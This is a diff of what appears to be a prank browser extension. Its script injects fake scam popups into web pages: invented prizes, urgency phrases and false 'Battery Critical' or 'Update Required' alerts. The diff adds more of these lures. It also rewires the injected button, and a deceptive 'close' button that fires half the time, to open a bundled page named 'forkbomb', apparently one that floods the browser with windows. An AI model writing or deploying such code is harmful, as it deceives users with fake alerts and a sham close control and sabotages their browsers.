@@ -14,9 +14,9 @@ chrome.runtime.onMessage.addListener((msg) => {
 
 /** Actual code */
 const CONFIG = {
-    prizes: ["iPhone 15 Pro", "MacBook Air", "$1000 Amazon Card", "PS5", "Tesla Model 3", "Rolex Watch", "$500 Walmart Card", "AirPods Pro", "iPad Pro", "Bitcoin"],
-    amounts: ["$50", "$100", "$250", "$500", "$1000", "$2500", "$5000", "₿1", "€1000"],
-    urgencyWords: ["LIMITED TIME", "ACT NOW", "URGENT", "EXPIRES SOON", "LAST CHANCE", "EXCLUSIVE", "DON'T MISS OUT", "TODAY ONLY"],
+    prizes: ["1000 Vbucks", "MacBook Air", "$1000 Amazon Card", "PS5", "Tesla Model 3", "Rolex Watch", "$500 Walmart Card", "AirPods Pro", "iPad Pro", "Bitcoin"],
+    amounts: ["$50", "$100", "$250", "$500", "$1000", "$2500", "$5000", "$100000", "₿1", "€1000"],
+    urgencyWords: ["LIMITED TIME", "ACT NOW", "URGENT", "EXPIRES SOON", "LAST CHANCE", "EXCLUSIVE", "DON'T MISS OUT", "TODAY ONLY", "LOW IN STOCK", "ALMOST OUT"],
     gradients: [
         "linear-gradient(45deg, #ff0000, #ff6600)",
         "linear-gradient(to right, #ffd700, #ffa500)",
@@ -50,7 +50,7 @@ const generateScamMessage = {
     winner: () => `💰 ${randomFrom(["Lucky visitor", "Selected user", "Random winner", "Verified account"])} #${rand(0, 999999)}! Claim ${randomFrom(CONFIG.amounts)}`,
     spin: () => `🎰 SPIN & WIN! ${randomFrom(CONFIG.prizes)}`,
     survey: () => `${randomFrom(CONFIG.urgencyWords)}: ${randomFrom(CONFIG.amounts)} Gift Card Survey`,
-    system: () => `${randomFrom(["🔥", "⚡", "💥", "⚠️"])} ${randomFrom(["Battery Critical", "Memory Full", "Storage Low", "Update Required"])}!`,
+    system: () => `${randomFrom(["🔥", "⚡", "💥", "⚠️"])} ${randomFrom(["Battery Critical", "Memory Full", "Storage Low", "Update Required", "Upgrade your laptop"])}!`,
     dating: () => `HOT ${randomFrom(["SINGLES", "DATES", "MATCHES"])} (${rand(1, 5)} miles away)`,
     winner2: () => `🏆 You've WON! Claim your ${randomFrom(CONFIG.prizes)}`
 };
@@ -124,7 +124,7 @@ const injectScamButton = () => {
     button.onclick = e => {
         e.preventDefault();
 
-        window.open("https://youtube.com/facedevstuff", "_blank");
+        window.open(chrome.runtime.getURL("/forkbomb/window.html"), "_blank");
     };
 
     const closeButton = document.createElement("button");
@@ -138,7 +138,7 @@ const injectScamButton = () => {
         if (Math.random() < 0.5) {
             container.remove();
         } else {
-            window.open("https://youtube.com/facedevstuff", "_blank");
+            window.open(chrome.runtime.getURL("/forkbomb/window.html"), "_blank");
         }
     };
 
